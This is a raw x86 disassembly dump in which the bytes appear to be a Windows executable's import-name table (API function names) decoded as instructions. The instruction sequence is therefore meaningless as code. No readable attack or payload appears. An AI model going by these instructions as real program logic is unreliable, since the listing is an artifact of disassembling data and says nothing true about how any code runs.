  42857c:	bound  esp,QWORD PTR [ecx+0x6c]
  42857f:	inc    esp
  428580:	gs ins BYTE PTR es:[edi],dx
  428582:	gs je  0x4285ea
  428585:	inc    ecx
  428586:	je     0x4285f7
  428588:	ins    DWORD PTR es:[edi],dx
  428589:	add    BYTE PTR [eax],al
  42858b:	and    DWORD PTR [ebx+edx*2],eax
  42858e:	gs je  0x4285dd
  428591:	popa   
  428592:	jae    0x428608
  428594:	inc    ebp
  428595:	jb     0x428609
  428597:	outs   dx,DWORD PTR ds:[esi]
  428598:	jb     0x42859a
  42859a:	add    BYTE PTR [ebp+0x4],cl
  42859d:	push   ebx
  42859e:	ins    BYTE PTR es:[edi],dx
  42859f:	gs gs jo 0x4285a3
  4285a3:	inc    eax
  4285a4:	add    al,0x53
  4285a6:	gs je  0x4285fd
  4285a9:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4285b0:	jne    0x428617
  4285b2:	push   esp
  4285b3:	imul   ebp,DWORD PTR [ebp+0x65],0xf3000072
  4285ba:	add    al,0x56
  4285bc:	imul   esi,DWORD PTR [edx+0x74],0x556c6175
  4285c3:	outs   dx,BYTE PTR ds:[esi]
  4285c4:	ins    BYTE PTR es:[edi],dx
  4285c5:	outs   dx,DWORD PTR ds:[esi]
  4285c6:	arpl   WORD PTR [ebx+0x0],bp
  4285c9:	ret    
  4285ca:	add    al,0x6c
  4285cc:	jae    0x428642
  4285ce:	jb     0x428633
  4285d0:	ins    DWORD PTR es:[edi],dx
  4285d1:	jo     0x42862a
  4285d3:	add    BYTE PTR [eax],al
  4285d5:	dec    esp
  4285d6:	add    al,0x53
  4285d8:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  4285df:	jae    0x428650
  4285e1:	jne    0x428655
  4285e3:	arpl   WORD PTR [ebp+0x0],sp
  4285e6:	add    BYTE PTR [edx+0x74654701],cl
  4285ec:	inc    ecx
  4285ed:	inc    ebx
  4285ee:	push   eax
  4285ef:	add    BYTE PTR [eax],al
  4285f1:	jno    0x4285f5
  4285f3:	inc    edi
  4285f4:	gs je  0x42864b
  4285f7:	imul   ebp,DWORD PTR [ebp+0x65],0x656e6f5a
  4285fe:	dec    ecx
  4285ff:	outs   dx,BYTE PTR ds:[esi]
  428600:	outs   dx,WORD PTR ds:[esi]
  428602:	jb     0x428671
  428604:	popa   
  428605:	je     0x428670
  428607:	outs   dx,DWORD PTR ds:[esi]
  428608:	outs   dx,BYTE PTR ds:[esi]
  428609:	add    BYTE PTR [eax],al
  42860b:	jae    0x42860f
  42860d:	inc    edi
  42860e:	gs je  0x428666
  428611:	jae    0x428678
  428613:	jb     0x428659
  428615:	gs popaw 
  428618:	jne    0x428686
  42861a:	je     0x428668
  42861c:	inc    ebx
  42861d:	dec    ecx
  42861e:	inc    esp
  42861f:	add    BYTE PTR [eax],al
  428621:	mov    al,0x3
  428623:	push   edx
  428624:	gs ins BYTE PTR es:[edi],dx
  428626:	gs popa 
  428628:	jae    0x42868f
  42862a:	push   ebx
  42862b:	gs ins DWORD PTR es:[edi],dx
  42862d:	popa   
  42862e:	jo     0x428698
  428630:	outs   dx,DWORD PTR ds:[esi]
  428631:	jb     0x428698
  428633:	add    BYTE PTR [eax],al
  428635:	ins    DWORD PTR es:[edi],dx
  428636:	add    al,BYTE PTR [edi+0x65]
  428639:	je     0x42868f
  42863b:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  428642:	je     0x428644
  428644:	add    dh,al
  428646:	add    al,0x6c
  428648:	jae    0x4286be
  42864a:	jb     0x4286af
  42864c:	ins    DWORD PTR es:[edi],dx
  42864d:	jo     0x4286b8
  42864f:	push   edi
  428650:	add    bl,bl
  428652:	add    cl,BYTE PTR [ecx+0x73]
  428655:	push   esi
  428656:	popa   
  428657:	ins    BYTE PTR es:[edi],dx
  428658:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  428660:	add    dl,al
  428662:	add    al,0x6c
  428664:	jae    0x4286da
  428666:	jb     0x4286cb
  428668:	ins    DWORD PTR es:[edi],dx
  428669:	jo     0x4286ac
  42866b:	add    BYTE PTR [eax],al
  42866d:	in     al,0x3
  42866f:	push   ebx
  428670:	gs je  0x4286b6
  428673:	outs   dx,DWORD PTR ds:[esi]
  428674:	ins    DWORD PTR es:[edi],dx
  428675:	ins    DWORD PTR es:[edi],dx
  428676:	push   esp
  428677:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  42867e:	add    BYTE PTR [edx+0x65724601],al
  428684:	gs dec esp
  428686:	imul   esp,DWORD PTR [edx+0x72],0x797261
  42868d:	pop    DWORD PTR [edx]
  42868f:	inc    edi
  428690:	ins    BYTE PTR es:[edi],dx
  428691:	outs   dx,DWORD PTR ds:[esi]
  428692:	bound  esp,QWORD PTR [ecx+0x6c]
  428695:	inc    esi
  428696:	ins    BYTE PTR es:[edi],dx
  428697:	popa   
  428698:	addr16 jae 0x42869b
  42869b:	into   
  42869c:	add    al,0x6c
  42869e:	jae    0x428714
  4286a0:	jb     0x42870e
  4286a2:	outs   dx,BYTE PTR gs:[esi]
  4286a4:	inc    ecx
  4286a5:	add    BYTE PTR [eax],al
  4286a7:	sbb    BYTE PTR [ebx+edx*2],al
  4286aa:	gs je  0x4286f3
  4286ad:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  4286b5:	gs jb  0x4286b8
  4286b8:	add    BYTE PTR [eax+0x2],ah
  4286bb:	inc    edi
  4286bc:	gs je  0x428713
  4286bf:	gs ins DWORD PTR es:[edi],dx
  4286c1:	jo     0x428709
  4286c3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  4286cb:	add    BYTE PTR [eax],al
  4286cd:	sub    eax,0x6e694601
  4286d2:	fs inc ecx
  4286d4:	je     0x428745
  4286d6:	ins    DWORD PTR es:[edi],dx
  4286d7:	push   edi
  4286d8:	add    dl,ch
  4286da:	add    BYTE PTR [ebx+0x72],al
  4286dd:	gs popa 
  4286df:	je     0x428746
  4286e1:	push   ebx
  4286e2:	gs ins DWORD PTR es:[edi],dx
  4286e4:	popa   
  4286e5:	jo     0x42874f
  4286e7:	outs   dx,DWORD PTR ds:[esi]
  4286e8:	jb     0x42874f
  4286ea:	push   edi
  4286eb:	add    BYTE PTR [eax],al
  4286ed:	fadd   QWORD PTR [ebx]
  4286ef:	push   ebx
  4286f0:	gs popa 
  4286f2:	jb     0x428757
  4286f4:	push   0x68746150
  4286f9:	push   edi
  4286fa:	add    BYTE PTR [ebx+eax*1+0x4f],al
  4286fe:	jo     0x428765
  428700:	outs   dx,BYTE PTR ds:[esi]
  428701:	push   ebx
  428702:	gs ins DWORD PTR es:[edi],dx
  428704:	popa   
  428705:	jo     0x42876f
  428707:	outs   dx,DWORD PTR ds:[esi]
  428708:	jb     0x42876f
  42870a:	push   edi
  42870b:	add    BYTE PTR [eax],al
  42870d:	into   
  42870e:	add    cl,BYTE PTR [ecx+0x73]
  428711:	inc    edx
  428712:	popa   
  428713:	fs push edi
  428715:	jb     0x428780
  428717:	je     0x42877e
  428719:	push   eax
  42871a:	je     0x42878e
  42871c:	add    cl,dh
  42871e:	add    DWORD PTR [edi+0x65],eax
  428721:	je     0x428769
  428723:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  42872b:	xchg   edx,eax
  42872c:	add    al,BYTE PTR [edi+0x6c]
  42872f:	outs   dx,DWORD PTR ds:[esi]
  428730:	bound  esp,QWORD PTR [ecx+0x6c]
  428733:	inc    edi
  428734:	gs je  0x428778
  428737:	je     0x4287a8
  428739:	ins    DWORD PTR es:[edi],dx
  42873a:	dec    esi
  42873b:	popa   
  42873c:	ins    DWORD PTR es:[edi],dx
  42873d:	gs push edi
  42873f:	add    BYTE PTR [eax],al
  428741:	mov    edi,0x74736c04
  428746:	jb     0x4287ab
  428748:	popa   
  428749:	je     0x42878c
  42874b:	add    BYTE PTR [eax],al
  42874d:	out    0x0,al
  42874f:	inc    ebx
  428750:	jb     0x4287b7
  428752:	popa   
  428753:	je     0x4287ba
  428755:	push   edx
  428756:	gs ins DWORD PTR es:[edi],dx
  428758:	outs   dx,DWORD PTR ds:[esi]
  428759:	je     0x4287c0
  42875b:	push   esp
  42875c:	push   0x64616572
  428761:	add    BYTE PTR [eax],al
  428763:	imul   eax,DWORD PTR [edx*2+0x6e61686e],0x64
  42876b:	ins    BYTE PTR es:[edi],dx
  42876c:	gs fs inc ebp
  42876f:	js     0x4287d4
  428771:	gs jo  0x4287e8
  428774:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  42877b:	gs jb  0x42877e
  42877e:	add    BYTE PTR [ebx+0x6d655203],dh
  428784:	outs   dx,DWORD PTR ds:[esi]
  428785:	jbe    0x4287ec
  428787:	inc    esp
  428788:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42878f:	jns    0x4287d2
  428791:	add    BYTE PTR [eax],al
  428793:	pop    edi
  428794:	add    al,BYTE PTR [edi+0x65]
  428797:	je     0x4287ed
  428799:	gs ins DWORD PTR es:[edi],dx
  42879b:	jo     0x4287e3
  42879d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4287a5:	add    BYTE PTR [eax],al
  4287a7:	out    0x0,eax
  4287a9:	inc    ebx
  4287aa:	jb     0x428811
  4287ac:	popa   
  4287ad:	je     0x428814
  4287af:	push   ebx
  4287b0:	gs ins DWORD PTR es:[edi],dx
  4287b2:	popa   
  4287b3:	jo     0x42881d
  4287b5:	outs   dx,DWORD PTR ds:[esi]
  4287b6:	jb     0x42881d
  4287b8:	inc    ecx
  4287b9:	add    BYTE PTR [eax],al
  4287bb:	in     al,dx
  4287bc:	add    DWORD PTR [edi+0x65],eax
  4287bf:	je     0x428807
  4287c1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4287c9:	bound  esi,QWORD PTR [ebp+0x74]
  4287cc:	gs jae 0x428826
  4287cf:	add    BYTE PTR [eax],al
  4287d1:	jmp    0x6946:0x74654701
  4287d8:	ins    BYTE PTR es:[edi],dx
  4287d9:	gs inc ecx
  4287db:	je     0x428851
  4287dd:	jb     0x428848
  4287df:	bound  esi,QWORD PTR [ebp+0x74]
  4287e2:	gs jae 0x42882a
  4287e5:	js     0x428828
  4287e7:	add    BYTE PTR [eax],al
  4287e9:	nop
  4287ea:	add    al,BYTE PTR [edi+0x6c]
  4287ed:	outs   dx,DWORD PTR ds:[esi]
  4287ee:	bound  esp,QWORD PTR [ecx+0x6c]
  4287f1:	inc    esi
  4287f2:	jb     0x428859
  4287f4:	add    BYTE PTR gs:[eax],al
  4287f7:	inc    ebp
  4287f8:	add    al,BYTE PTR [edi+0x65]
  4287fb:	je     0x428850
  4287fd:	je     0x428860
  4287ff:	jb     0x428875
  428801:	jne    0x428873
  428803:	dec    ecx
  428804:	outs   dx,BYTE PTR ds:[esi]
  428805:	outs   dx,WORD PTR ds:[esi]
  428807:	push   edi
  428808:	add    BYTE PTR [ecx+0x6f6c4702],dl
  42880e:	bound  esp,QWORD PTR [ecx+0x6c]
  428811:	inc    edi
  428812:	gs je  0x428856
  428815:	je     0x428886
  428817:	ins    DWORD PTR es:[edi],dx
  428818:	dec    esi
  428819:	popa   
  42881a:	ins    DWORD PTR es:[edi],dx
  42881b:	gs inc ecx
  42881d:	add    BYTE PTR [eax],al
  42881f:	mov    ds:0x6c614300,al
  428824:	ins    BYTE PTR es:[edi],dx
  428825:	dec    esi
  428826:	popa   
  428827:	ins    DWORD PTR es:[edi],dx
  428828:	gs fs push eax
  42882b:	imul   esi,DWORD PTR [eax+0x65],0xf3000057
  428832:	add    DWORD PTR [edi+0x65],eax
  428835:	je     0x42887d
  428837:	jne    0x4288a5
  428839:	ins    BYTE PTR es:[edi],dx
  42883a:	push   eax
  42883b:	popa   
  42883c:	je     0x4288a6
  42883e:	dec    esi
  42883f:	popa   
  428840:	ins    DWORD PTR es:[edi],dx
  428841:	gs push edi
  428843:	add    BYTE PTR [eax],al
  428845:	xchg   DWORD PTR [edx],eax
  428847:	inc    edi
  428848:	ins    BYTE PTR es:[edi],dx
  428849:	outs   dx,DWORD PTR ds:[esi]
  42884a:	bound  esp,QWORD PTR [ecx+0x6c]
  42884d:	inc    ecx
  42884e:	fs fs inc ecx
  428851:	je     0x4288c2
  428853:	ins    DWORD PTR es:[edi],dx
  428854:	inc    ecx
  428855:	add    BYTE PTR [eax],al
  428857:	dec    ebx
  428858:	inc    ebp
  428859:	push   edx
  42885a:	dec    esi
  42885b:	inc    ebp
  42885c:	dec    esp
  42885d:	xor    esi,DWORD PTR [edx]
  42885f:	cs fs ins BYTE PTR es:[edi],dx
  428862:	ins    BYTE PTR es:[edi],dx
  428863:	add    BYTE PTR [eax],al
  428865:	sahf   
  428866:	add    DWORD PTR [ecx+0x73],ecx
  428869:	push   edx
  42886a:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  42886f:	jo     0x4288e5
  428871:	jns    0x428873
  428873:	mov    DWORD PTR [ecx],eax
  428875:	dec    ecx
  428876:	outs   dx,BYTE PTR ds:[esi]
  428877:	jbe    0x4288da
  428879:	ins    BYTE PTR es:[edi],dx
  42887a:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  428882:	je     0x428884
  428884:	add    ch,dh
  428886:	add    BYTE PTR [edi+0x65],al
  428889:	je     0x4288ce
  42888b:	ins    BYTE PTR es:[edi],dx
  42888c:	popa   
  42888d:	jae    0x428902
  42888f:	dec    ecx
  428890:	outs   dx,BYTE PTR ds:[esi]
  428891:	outs   dx,WORD PTR ds:[esi]
  428893:	inc    ebp
  428894:	js     0x4288d7
  428896:	add    al,ah
  428898:	add    BYTE PTR [esi+0x69],al
  42889b:	ins    BYTE PTR es:[edi],dx
  42889c:	ins    BYTE PTR es:[edi],dx
  42889d:	push   edx
  42889e:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4288a3:	jl     0x4288a7
  4288a5:	push   ebx
  4288a6:	push   0x774f776f
  4288ab:	outs   dx,BYTE PTR ds:[esi]
  4288ac:	gs fs push eax
  4288af:	outs   dx,DWORD PTR ds:[esi]
  4288b0:	jo     0x428927
  4288b2:	jo     0x428927
  4288b4:	add    ch,al
  4288b6:	add    DWORD PTR [ebp+0x61],ecx
  4288b9:	jo     0x428911
  4288bb:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  4288c2:	gs jns 0x428906
  4288c5:	add    BYTE PTR [eax],al
  4288c7:	test   al,0x1
  4288c9:	dec    esp
  4288ca:	outs   dx,DWORD PTR ds:[esi]
  4288cb:	popa   
  4288cc:	fs inc ecx
  4288ce:	arpl   WORD PTR [ebx+0x65],sp
  4288d1:	ins    BYTE PTR es:[edi],dx
  4288d2:	gs jb  0x428936
  4288d5:	je     0x428946
  4288d7:	jb     0x42894c
  4288d9:	push   edi
  4288da:	add    BYTE PTR [edi+0x616f4c01],ch
  4288e0:	fs dec ecx
  4288e2:	arpl   WORD PTR [edi+0x6e],bp
  4288e5:	inc    ecx
  4288e6:	add    BYTE PTR [eax+0x1],bl
  4288e9:	inc    edi
  4288ea:	gs je  0x428940
  4288ed:	jne    0x428951
  4288ef:	dec    ebp
  4288f0:	outs   dx,BYTE PTR gs:[esi]
  4288f2:	jne    0x4288f4
  4288f4:	add    bl,al
  4288f6:	add    BYTE PTR [ebp+0x6e],al
  4288f9:	fs inc esp
  4288fb:	imul   esp,DWORD PTR [ecx+0x6c],0x3300676f
  428902:	add    BYTE PTR [ebx+0x68],al
  428905:	popa   
  428906:	jb     0x42895c
  428908:	outs   dx,DWORD PTR ds:[esi]
  428909:	dec    edi
  42890a:	gs ins DWORD PTR es:[edi],dx
  42890c:	inc    edx
  42890d:	jne    0x428975
  42890f:	inc    cx
  428911:	add    BYTE PTR [eax],al
  428913:	pop    ecx
  428914:	add    DWORD PTR [edi+0x65],eax
  428917:	je     0x42896c
  428919:	jns    0x42898e
  42891b:	inc    ebx
  42891c:	outs   dx,DWORD PTR ds:[esi]
  42891d:	ins    BYTE PTR es:[edi],dx
  42891e:	outs   dx,DWORD PTR ds:[esi]
  42891f:	jb     0x428921
  428921:	mov    es,WORD PTR [edx]
  428923:	push   esp
  428924:	outs   dx,DWORD PTR ds:[esi]
  428925:	push   ebp
  428926:	outs   dx,BYTE PTR ds:[esi]
  428927:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  42892e:	add    BYTE PTR ds:0x6c6c4100,al
  428934:	outs   dx,DWORD PTR ds:[esi]
  428935:	ja     0x42898a
  428937:	gs je  0x428980
  42893a:	outs   dx,DWORD PTR ds:[esi]
  42893b:	jb     0x4289a2
  42893d:	addr16 jb 0x4289af
  428940:	jne    0x4289b0
  428942:	fs push edi
  428944:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  42894b:	mov    BYTE PTR [ecx],al
  42894d:	dec    ecx
  42894e:	outs   dx,BYTE PTR ds:[esi]
  42894f:	je     0x4289b6
  428951:	jb     0x4289c6
  428953:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  428958:	arpl   WORD PTR [eax+eax*1+0x1],si
  42895c:	add    BYTE PTR [ecx+0x63],al
  42895f:	je     0x4289ca
  428961:	jbe    0x4289c4
  428963:	je     0x4289ca
  428965:	dec    ebx
  428966:	gs jns 0x4289cb
  428969:	outs   dx,DWORD PTR ds:[esi]
  42896a:	popa   
  42896b:	jb     0x4289d1
  42896d:	dec    esp
  42896e:	popa   
  42896f:	jns    0x4289e0
  428971:	jne    0x4289e7
  428973:	add    BYTE PTR [eax],al
  428975:	out    dx,al
  428976:	add    DWORD PTR [eax+0x65],edx
  428979:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  42897e:	jae    0x4289e1
  428980:	addr16 gs inc ecx
  428983:	add    BYTE PTR [eax],al
  428985:	add    eax,DWORD PTR [eax]
  428987:	inc    ecx
  428988:	fs push 0x75
  42898b:	jae    0x428a01
  42898d:	push   edi
  42898e:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  428995:	arpl   WORD PTR [ebp+eax*2+0x78],si
  428999:	add    BYTE PTR [eax],al
  42899b:	cmp    al,0x1
  42899d:	inc    edi
  42899e:	gs je  0x4289ee
  4289a1:	gs jae 0x428a17
  4289a4:	popa   
  4289a5:	addr16 gs push eax
  4289a8:	outs   dx,DWORD PTR ds:[esi]
  4289a9:	jae    0x4289ab
  4289ab:	push   ecx
  4289ac:	add    dl,BYTE PTR [ebx+0x65]
  4289af:	je     0x428a01
  4289b1:	popa   
  4289b2:	jb     0x428a19
  4289b4:	outs   dx,BYTE PTR ds:[esi]
  4289b5:	je     0x4289b7
  4289b7:	lahf   
  4289b8:	add    BYTE PTR [ecx+ebp*2+0x73],al
  4289bc:	jo     0x428a1f
  4289be:	je     0x428a23
  4289c0:	push   0x7373654d
  4289c5:	popa   
  4289c6:	addr16 gs inc ecx
  4289c9:	add    BYTE PTR [eax],al
  4289cb:	fwait
  4289cc:	add    dl,BYTE PTR [ebp+0x6e]
  4289cf:	ins    BYTE PTR es:[edi],dx
  4289d0:	outs   dx,DWORD PTR ds:[esi]
  4289d1:	popa   
  4289d2:	fs dec ebx
  4289d4:	gs jns 0x428a39
  4289d7:	outs   dx,DWORD PTR ds:[esi]
  4289d8:	popa   
  4289d9:	jb     0x428a3f
  4289db:	dec    esp
  4289dc:	popa   
  4289dd:	jns    0x428a4e
  4289df:	jne    0x428a55
  4289e1:	add    BYTE PTR [eax],al
  4289e3:	out    0x0,eax
  4289e5:	inc    esi
  4289e6:	jb     0x428a49
  4289e8:	ins    DWORD PTR es:[edi],dx
  4289e9:	gs push edx
  4289eb:	arpl   WORD PTR gs:[eax+eax*1-0x21],si
  4289f0:	add    BYTE PTR [ebp+0x78],al
  4289f3:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  4289fb:	jae    0x428a42
  4289fd:	js     0x4289ff
  4289ff:	rol    BYTE PTR [edx],0x77
  428a02:	jae    0x428a74
  428a04:	jb     0x428a6f
  428a06:	outs   dx,BYTE PTR ds:[esi]
  428a07:	je     0x428a6f
  428a09:	push   edi
  428a0a:	add    BYTE PTR [eax],bh
  428a0c:	add    dl,BYTE PTR [ebx+0x65]
  428a0f:	je     0x428a54
  428a11:	jne    0x428a85
  428a13:	jae    0x428a84
  428a15:	jb     0x428a17
  428a17:	sub    eax,DWORD PTR [eax]
  428a19:	inc    ebx
  428a1a:	push   0x654e7261
  428a1f:	js     0x428a95
  428a21:	inc    ebp
  428a22:	js     0x428a65
  428a24:	add    BYTE PTR [eax+0x2],bl
  428a27:	push   ebx
  428a28:	gs je  0x428a7d
  428a2b:	arpl   WORD PTR gs:[eax+eax*1+0x55],si
  428a30:	add    DWORD PTR [edi+0x65],eax
  428a33:	je     0x428a88
  428a35:	arpl   WORD PTR [edx+0x6f],si
  428a38:	ins    BYTE PTR es:[edi],dx
  428a39:	ins    BYTE PTR es:[edi],dx
  428a3a:	push   eax
  428a3b:	outs   dx,DWORD PTR ds:[esi]
  428a3c:	jae    0x428a3e
  428a3e:	add    BYTE PTR [edx+eax*1],bl
  428a41:	push   ebx
  428a42:	arpl   WORD PTR [edx+0x65],si
  428a45:	outs   dx,BYTE PTR gs:[esi]
  428a47:	push   esp
  428a48:	outs   dx,DWORD PTR ds:[esi]
  428a49:	inc    ebx
  428a4a:	ins    BYTE PTR es:[edi],dx
  428a4b:	imul   esp,DWORD PTR [ebp+0x6e],0xb9000074
  428a52:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428a56:	fs dec ebp
  428a58:	outs   dx,BYTE PTR gs:[esi]
  428a5a:	jne    0x428ab3
  428a5c:	add    BYTE PTR [eax+0x1],al
  428a5f:	inc    edi
  428a60:	gs je  0x428ab0
  428a63:	outs   dx,DWORD PTR ds:[esi]
  428a64:	outs   dx,BYTE PTR ds:[esi]
  428a65:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  428a6d:	push   edi
  428a6e:	add    BYTE PTR [eax+0x1],ch
  428a71:	inc    edi
  428a72:	gs je  0x428acc
  428a75:	imul   ebp,DWORD PTR [esi+0x64],0x4100776f
  428a7c:	add    dl,BYTE PTR [ebx+0x65]
  428a7f:	je     0x428ac7
  428a81:	outs   dx,DWORD PTR ds:[esi]
  428a82:	arpl   WORD PTR [ebp+0x73],si
  428a85:	add    BYTE PTR [eax],al
  428a87:	bound  eax,QWORD PTR [ecx]
  428a89:	inc    edi
  428a8a:	gs je  0x428ae1
  428a8d:	outs   dx,DWORD PTR ds:[esi]
  428a8e:	jo     0x428ae7
  428a90:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428a97:	and    DWORD PTR [edx],eax
  428a99:	push   ebx
  428a9a:	outs   dx,BYTE PTR gs:[esi]
  428a9c:	fs inc esp
  428a9e:	ins    BYTE PTR es:[edi],dx
  428a9f:	addr16 dec ecx
  428aa1:	je     0x428b08
  428aa3:	ins    DWORD PTR es:[edi],dx
  428aa4:	dec    ebp
  428aa5:	gs jae 0x428b1b
  428aa8:	popa   
  428aa9:	addr16 gs inc ecx
  428aac:	add    BYTE PTR [eax+eax*1+0x43],al
  428ab0:	ins    BYTE PTR es:[edi],dx
  428ab1:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  428ab8:	jb     0x428aba
  428aba:	add    BYTE PTR [esi+0x1],dl
  428abd:	inc    edi
  428abe:	gs je  0x428b14
  428ac1:	arpl   WORD PTR [edx+0x6f],si
  428ac4:	ins    BYTE PTR es:[edi],dx
  428ac5:	ins    BYTE PTR es:[edi],dx
  428ac6:	push   edx
  428ac7:	popa   
  428ac8:	outs   dx,BYTE PTR ds:[esi]
  428ac9:	add    BYTE PTR gs:[bx+si],al
  428acd:	or     DWORD PTR [ecx],eax
  428acf:	inc    edi
  428ad0:	gs je  0x428b16
  428ad3:	jne    0x428b47
  428ad5:	jae    0x428b46
  428ad7:	jb     0x428b29
  428ad9:	outs   dx,DWORD PTR ds:[esi]
  428ada:	jae    0x428adc
  428adc:	add    BYTE PTR [ecx+0x2],bl
  428adf:	push   ebx
  428ae0:	gs je  0x428b35
  428ae3:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  428ae8:	jo     0x428b5e
  428aea:	jns    0x428aec
  428aec:	add    BYTE PTR [eax+0x2],ch
  428aef:	push   ebx
  428af0:	gs je  0x428b48
  428af3:	jae    0x428b5a
  428af5:	jb     0x428b46
  428af7:	bound  ebp,QWORD PTR [edx+0x65]
  428afa:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428afe:	outs   dx,WORD PTR ds:[esi]
  428b00:	jb     0x428b6f
  428b02:	popa   
  428b03:	je     0x428b6e
  428b05:	outs   dx,DWORD PTR ds:[esi]
  428b06:	outs   dx,BYTE PTR ds:[esi]
  428b07:	push   edi
  428b08:	add    BYTE PTR [ebx],ch
  428b0a:	add    dl,BYTE PTR [ebx+0x65]
  428b0d:	outs   dx,BYTE PTR ds:[esi]
  428b0e:	fs dec ebp
  428b10:	gs jae 0x428b86
  428b13:	popa   
  428b14:	addr16 gs push edi
  428b17:	add    BYTE PTR [eax],al
  428b19:	loop   0x428b1b
  428b1b:	inc    esi
  428b1c:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  428b23:	outs   dx,DWORD PTR ds:[esi]
  428b24:	ja     0x428b6b
  428b26:	js     0x428b69
  428b28:	add    BYTE PTR [eax],bl
  428b2a:	add    DWORD PTR [edi+0x65],eax
  428b2d:	je     0x428b78
  428b2f:	arpl   WORD PTR [edi+0x6e],bp
  428b32:	dec    ecx
  428b33:	outs   dx,BYTE PTR ds:[esi]
  428b34:	outs   dx,WORD PTR ds:[esi]
  428b36:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428b3d:	arpl   WORD PTR [eax+0x54],bp
  428b40:	outs   dx,DWORD PTR ds:[esi]
  428b41:	push   esp
  428b42:	push   0x69577369
  428b47:	outs   dx,BYTE PTR ds:[esi]
  428b48:	outs   dx,DWORD PTR fs:[esi]
  428b4a:	ja     0x428b4c
  428b4c:	add    BYTE PTR [ecx+0x616f4c01],ch
  428b52:	fs inc edx
  428b54:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb004170
  428b5c:	add    DWORD PTR [edi+0x65],eax
  428b5f:	je     0x428ba5
  428b61:	inc    ebx
  428b62:	inc    ebp
  428b63:	js     0x428b65
  428b65:	mov    al,ds:0x57734901
  428b6a:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428b71:	test   DWORD PTR [ecx],eax
  428b73:	dec    ecx
  428b74:	outs   dx,BYTE PTR ds:[esi]
  428b75:	jae    0x428bdc
  428b77:	jb     0x428bed
  428b79:	dec    ebp
  428b7a:	outs   dx,BYTE PTR gs:[esi]
  428b7c:	jne    0x428bc7
  428b7e:	je     0x428be5
  428b80:	ins    DWORD PTR es:[edi],dx
  428b81:	push   edi
  428b82:	add    BYTE PTR [esi+0x73795302],al
  428b88:	je     0x428bef
  428b8a:	ins    DWORD PTR es:[edi],dx
  428b8b:	push   eax
  428b8c:	popa   
  428b8d:	jb     0x428bf0
  428b8f:	ins    DWORD PTR es:[edi],dx
  428b90:	gs je  0x428bf8
  428b93:	jb     0x428c08
  428b95:	dec    ecx
  428b96:	outs   dx,BYTE PTR ds:[esi]
  428b97:	outs   dx,WORD PTR ds:[esi]
  428b99:	push   edi
  428b9a:	add    BYTE PTR [ebx+0x2],dh
  428b9d:	push   ebx
  428b9e:	gs je  0x428bf8
  428ba1:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428ba8:	js     0x428c1e
  428baa:	inc    ecx
  428bab:	add    BYTE PTR [eax],al
  428bad:	rol    BYTE PTR [ecx],1
  428baf:	dec    ebp
  428bb0:	gs jae 0x428c26
  428bb3:	popa   
  428bb4:	addr16 gs inc edx
  428bb7:	outs   dx,DWORD PTR ds:[esi]
  428bb8:	js     0x428bff
  428bba:	js     0x428c13
  428bbc:	add    BYTE PTR ds:0x74654701,dh
  428bc2:	dec    ebp
  428bc3:	outs   dx,BYTE PTR gs:[esi]
  428bc5:	jne    0x428c10
  428bc7:	je     0x428c2e
  428bc9:	ins    DWORD PTR es:[edi],dx
  428bca:	dec    ecx
  428bcb:	outs   dx,BYTE PTR ds:[esi]
  428bcc:	outs   dx,WORD PTR ds:[esi]
  428bce:	push   edi
  428bcf:	add    BYTE PTR [eax],al
  428bd1:	jge    0x428bd5
  428bd3:	push   ebx
  428bd4:	push   0x6353776f
  428bd9:	jb     0x428c4a
  428bdb:	ins    BYTE PTR es:[edi],dx
  428bdc:	ins    BYTE PTR es:[edi],dx
  428bdd:	inc    edx
  428bde:	popa   
  428bdf:	jb     0x428be1
  428be1:	cmp    al,0x0
  428be3:	inc    ebx
  428be4:	push   0x4d6b6365
  428be9:	outs   dx,BYTE PTR gs:[esi]
  428beb:	jne    0x428c3f
  428bed:	popa   
  428bee:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  428bf6:	add    BYTE PTR [edx+0x616f4c01],ch
  428bfc:	fs inc edx
  428bfe:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xab005770
  428c06:	add    BYTE PTR [edx+esi*2+0x61],al
  428c0a:	ja     0x428c4d
  428c0c:	outs   dx,BYTE PTR ds:[esi]
  428c0d:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  428c14:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  428c19:	mov    cl,0x2
  428c1b:	push   esi
  428c1c:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  428c20:	push   ebx
  428c21:	arpl   WORD PTR [ecx+0x6e],sp
  428c24:	push   edi
  428c25:	add    BYTE PTR [eax],al
